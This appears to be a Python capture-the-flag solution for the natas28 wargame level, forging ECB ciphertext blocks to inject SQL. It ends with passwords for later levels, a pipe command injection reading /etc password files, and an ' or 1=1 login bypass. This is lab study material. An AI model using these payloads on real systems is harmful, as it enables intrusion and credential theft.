#helloes there!

#(this is pretty random, beware^^)

#we were trying to solve the natas challenges in overthewire.org, and the first couple of levels were a great fun, we are working on level29 now but we are
#sort of out of ideas:( and so, we resorted to harassing random people who solved this challenge in hopes to get some hint! and well, apparently according
#to a few googly wild guesses, you are such a person:) below are some details of what we have tried, howeverwe have been breaking our heads on this one for a
#pretty long time now, and we are all out of heads:( any hint in the right direction will be much appreciated^^


import requests, string, urllib, re

possible_chars = string.digits+string.ascii_uppercase+string.ascii_lowercase
urll = "http://natas28.natas.labs.overthewire.org/"
basic_auth = requests.auth.HTTPBasicAuth("natas28","JWwR438wkgTsNKBbcJoowyysdM82YjeF")

def get_encoded(clear):
    r=requests.post(urll,data={"query":clear}, auth=basic_auth)
    return urllib.unquote(re.match(".*query=(.*)",r.url).group(1)).decode("base64")

def split(data,blocksize):
	return [i for i in [data[i:i+blocksize] for i in range(0,len(data),blocksize)]]

####
####check for blocksize
####for i in range(42):
####	print i,len(get_encoded('a'*i))
####seems to be 16!
####
####
####check if encryption is done distinctly on each block(ecb)
####print split(get_encoded('a'*100),16)
####and that is indeed the case!
####
####check for where constant blocks in the ciphertext exist
####a12 = split(get_encoded('a'*12),16)
####b12 = split(get_encoded('b'*12),16)
####for i in range(len(a12)):
####    print a12[i]==b12[i]
####
####
####combining that with the error message retrieved from changing the query parameter to some random data,
####we know that the plaintext has the form of [some constant data][our query][some constant data][pkcs7 padding]
####
####let's try to retrieve some of the plaintext - note that when we send 12 characters the ciphertext is 80bytes long
####but when we send 13 characters the ciphertext is 96, so when we send 13 characters, the last block of plaintext will be
####'X\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f' where X is the final letter of the plaintext(rest is the pkcs padding)
####so we are going to try all possibilities for X and see when we get an identical block when encrypting X+15*'\x0f',
####this should give us the final letter of the plaintext.
####
####(note that because we aren't sure when does our controlled text start in the third block, we'll try 16 options(with different amounts
####of extra 'a's to shift our data, in one of these options our guess would start exactly in the start of a block.
####
####good = get_encoded('a'*13)[-16:]
####for j in range(256):
####    for i in range(15):
####        guess = chr(j)+'\x0f'*15
####        current=get_encoded('a'*i+guess*5) #*5 just for easier inspection^^
####        if split(current,16)[5]==good:
####            print 'found! {}'.format(chr(j))
####
####this gave no result(worrisome!) and when trying a similar approach but for the character right after our query instead of before the padding)
####we got that it's value was "%", but then the next step failed to find anything for the second character...
####res89 = get_encoded('a'*89)
####for i in string.printable:
####	
####	if get_encoded('a'*89+i)[112:128] == res89[112:128]:
####		print 'found: {}'.format(i)
####
####we realised that something is probably messing up our query in a way... for example if the next character after the %(or the last character) were a character
####that gets escaped, this approach wouldn't work.
####
####checking if certain characters are escaped(and will therefore result in 2characters worth of plaintext instead of one):
####chars=[]
####for i in range(256):
####    if len(get_encoded('a'*11+chr(i))) > 80: #because 13 characters will create a new block but 12 won't!
####        chars+=[chr(i)]
####print chars
####
####yay! it seems like ['\x00', '\n', '\r', '\x1a', '"', "'", '\\'] are escaped, that explains why our crypto attempt didn't really work out.
####also, these are exactly the characters escaped by mysql_real_escape_string, so it would be safe to assume that this
####is indeed what is being used here(also makes sense considering we saw % and _ aren't escaped).
####
####so to sum it up, we collected enough data to assume the plaintext is something resembling...
####"select column from table where column like '%[OUR_ESCAPED_QUERY_HERE]%' limit 3", it is also vaguely close to the amount of bytes in the uncontrolled plaintext(68)
####
####we tried bypassing mysql_real_escape_string with \xbf\x27 but that didn't really work out..
####
####well, that's it for now! thanks for your time if you've read this far, cheers:D
####


####and finally, after harassing random strangers and hitting numerous heads into unsuspecting walls... the solution!

def parse(stuff):
	return [i for i in [stuff[i:i+16] for i in range(0,len(stuff),16)]]

def query(stuff):
    st = get_encoded('a'*10)
    goodbin = get_encoded('a'*9+"'"+" "*15)[48:64]
    stuff = stuff+'#'
    stuff = parse(stuff+(16-len(stuff)%16)*'#')
    stuff = [get_encoded('a'*10+i)[48:64] for i in stuff]
    end = st[:48]+goodbin+''.join(stuff)+st[48:]
    r = requests.get(urll+'search.php/?query='+urllib.quote(end.encode('base64')),auth=basic_auth)
    return r.content
####playing around with the query function, good stuff in the database, woohoo:)   

#wie9iexae0Daihohv8vuu3cei9wahf0e
#view-source:http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/nat*/n*%00

#hay7aecuungiuKaezuathuk9biin0pu1
#username=' or 1=1&username=2&password=' or 1=1&password=2
